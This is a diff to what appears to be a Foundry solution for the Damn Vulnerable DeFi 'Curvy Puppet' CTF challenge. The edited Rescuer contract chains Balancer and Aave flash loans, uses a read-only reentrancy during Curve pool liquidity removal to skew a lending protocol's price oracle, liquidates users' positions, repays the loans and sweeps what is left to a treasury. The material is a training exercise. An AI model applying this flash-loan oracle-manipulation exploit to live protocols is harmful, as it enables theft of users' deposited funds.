@@ -163,7 +163,7 @@ contract CurvyPuppetChallenge is Test {
         users[1] = bob;
         users[2] = charlie;
 
-        Rescuer rescuer = new Rescuer(lending, player, users);
+        Rescuer rescuer = new Rescuer(lending, treasury, dvt, player, users);
         weth.transferFrom(treasury, address(rescuer), TREASURY_WETH_BALANCE);
         IERC20(curvePool.lp_token()).transferFrom(treasury, address(rescuer), TREASURY_LP_BALANCE);
         rescuer.rescue();
@@ -193,17 +193,6 @@ contract CurvyPuppetChallenge is Test {
     }
 }
 
-interface IUniswapV2Router02 {
-    function swapExactTokensForTokens(
-        uint amountIn,
-        uint amountOutMin,
-        address[] calldata path,
-        address to,
-        uint deadline
-    ) external returns (uint[] memory amounts);
-
-}
-
 contract Rescuer is Test{
     CurvyPuppetLending public lending;
     IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
@@ -211,17 +200,25 @@ contract Rescuer is Test{
     IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
     WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
 
+
     // Find pool address from https://aave.com/docs/resources/addresses, choose v2 pool!
     address constant aavePool = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
     address constant balancerPool = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
     address immutable player;
+    address immutable treasury;
+    DamnValuableToken immutable dvt;
     address[] users;
+
+    uint256 private wethAmountToRepay = 0;
+    uint256 private stETHAmountToRepay = 0;
 
     bool trigger = false;
 
-    constructor(CurvyPuppetLending _lending, address _player, address[] memory _users) {
+    constructor(CurvyPuppetLending _lending, address _treasury, DamnValuableToken _dvt, address _player, address[] memory _users) {
         lending = _lending;
         player = _player;
+        treasury = _treasury;
+        dvt = _dvt;
 
         for (uint256 i = 0; i < _users.length; i++) {
             users.push(_users[i]);
@@ -303,7 +300,7 @@ contract Rescuer is Test{
         assets[0] = address(weth);
 
         uint256[] memory amounts = new uint256[](1);
-        amounts[0] = 30000 ether;
+        amounts[0] = 37900 ether;
 
         (bool success,) = balancerPool.call(abi.encodeWithSignature("flashLoan(address,address[],uint256[],bytes)",
                                                                     address(this), // receiverAddress
@@ -332,7 +329,7 @@ contract Rescuer is Test{
 
 
         uint256[] memory amounts = new uint256[](2);
-        amounts[0] = 38000 ether;
+        amounts[0] = 25900 ether;
         amounts[1] = 172000 ether;
 
         uint256[] memory interestRateModes = new uint256[](2); // leave it to default 0
@@ -367,6 +364,9 @@ contract Rescuer is Test{
         console.log("stETH balance required to repay AAVE: ", stETHAmount + stETHPremium);
         console.log("weth balance required to repay AAVE: ", wethAmount + wethPremium);
 
+        wethAmountToRepay += wethAmount + wethPremium;
+        stETHAmountToRepay += stETHAmount + stETHPremium;
+
         // For repayment
         weth.approve(aavePool, type(uint256).max);
         stETH.approve(aavePool, type(uint256).max);
@@ -389,24 +389,52 @@ contract Rescuer is Test{
 
         console.log("Balancer repayment amount: ", amount + premium);
 
+        wethAmountToRepay+= amount + premium; // premium is zero because Balancer has zero fee
+
+        console.log("WETH balance : ", weth.balanceOf(address(this)));
+        console.log("stETH balance : ", stETH.balanceOf(address(this)));
+
         weth.withdraw(weth.balanceOf(address(this)));
         IERC20(stETH).approve(address(curvePool), type(uint256).max);
 
         uint256 stETHBalance = IERC20(stETH).balanceOf(address(this));
-        curvePool.add_liquidity{value: 68000 ether}([68000 ether, stETHBalance], block.timestamp + 1 days);
+        curvePool.add_liquidity{value: 64000 ether}([64000 ether, stETHBalance], block.timestamp + 1 days);
 
         trigger = true;
         uint256 lpTokenBalance = IERC20(curvePool.lp_token()).balanceOf(address(this));
-        uint256[2] memory withdrawn  = curvePool.remove_liquidity(lpTokenBalance - 3 ether, [uint256(0), uint256(0)]); // Keep some LP token, 3 ether, enough to repay during CurvyPuppetLending liquidating
-        weth.deposit{value: address(this).balance}();
+        uint256[2] memory withdrawn  = curvePool.remove_liquidity(lpTokenBalance - 6 ether, [uint256(0), uint256(0)]); // Keep some LP token, 3 ether, enough to repay during CurvyPuppetLending liquidating
         trigger = false;
 
         // Repay balancer
         weth.approve(balancerPool, amount + premium);
 
+        uint256 ethToExchange = address(this).balance - wethAmountToRepay;
+        uint256 stETHReceived = curvePool.exchange{value: ethToExchange}(
+            0, // from coin index (ETH)
+            1, // to coin index (stETH)
+            ethToExchange, // amount in
+            0 // min amount out
+        );
+
+        // Get back ETH from extra stETH
+        uint256 extraStETH = stETH.balanceOf(address(this)) - stETHAmountToRepay;
+        curvePool.exchange(1, 0, extraStETH, 0);
+
+        weth.deposit{value: address(this).balance}();
+
+        weth.transfer(balancerPool, amount + premium);
+        balancerPool.call(abi.encodeWithSignature("settle(address,uint256)",
+                                                  address(weth),
+                                                  amount + premium));
+
+        console.log("LP token balance:" , IERC20(curvePool.lp_token()).balanceOf(address(this)));
         console.log("stETH balance left ", stETH.balanceOf(address(this)));
         console.log("weth balance left ", weth.balanceOf(address(this)));
 
+        // Transfer weth, lptoken, dvt left to treasury
+        weth.transfer(treasury, weth.balanceOf(address(this)) - (wethAmountToRepay - amount + premium));
+        IERC20(curvePool.lp_token()).transfer(treasury, IERC20(curvePool.lp_token()).balanceOf(address(this)));
+        dvt.transfer(treasury, dvt.balanceOf(address(this)));
     }
 
     receive() external payable {
@@ -426,3 +454,5 @@ contract Rescuer is Test{
 // - Trial and error to get the max value in lending pool
 // - Do some math to get the expected ratio which can tirgger the liquidity
 // - Place the callback right with the bad state occurs
+// - Balancer has free flashloan
+// - Uniswap is a last resort, it is fee is high compared to flashloans
